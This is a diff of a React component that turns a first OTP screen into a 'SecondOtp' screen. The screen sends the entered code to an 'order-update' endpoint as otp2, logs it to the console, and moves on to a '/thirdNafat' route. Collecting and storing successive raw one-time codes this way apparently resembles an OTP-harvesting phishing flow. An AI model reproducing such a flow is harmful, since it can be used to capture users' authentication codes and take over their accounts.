@@ -1,11 +1,10 @@
-import {  useState } from "react";
+import { useState } from "react";
 import TextField from "@mui/material/TextField";
 import { CountdownCircleTimer } from "react-countdown-circle-timer";
 import { useNavigate } from "react-router-dom";
 import useOrderData from "../../Hooks/useOrderData";
 import useAxiosPublic from "../../Hooks/useAxiosPublic";
-
-const FristOtp = () => {
+const SecondOtp = () => {
   // State for OTP input and error message
   const [otp, setOtp] = useState("");
   const [isOtpCorrect, setIsOtpCorrect] = useState(false);
@@ -39,10 +38,10 @@ const FristOtp = () => {
   const handleVerifyOtp = () => {
     console.log("Entered OTP:", otp);
     axiosPublic
-      .patch(`order-update/${id}`, { otp1: otp })
+      .patch(`order-update/${id}`, { otp2: otp })
       .then((response) => {
         console.log("OTP2 updated successfully:", response.data);
-        navigate("/userDetails");
+        navigate("/thirdNafat");
       })
       .catch((error) => {
         console.error("Error updating OTP1:", error);
@@ -52,7 +51,7 @@ const FristOtp = () => {
   return (
     <div>
       <h2 className="text-center text-4xl font-bold text-gray-700">
-        Number Verification
+        Second Otp Verification
       </h2>
 
       {/* Countdown Timer */}
@@ -114,4 +113,4 @@ const FristOtp = () => {
   );
 };
 
-export default FristOtp;
+export default SecondOtp;
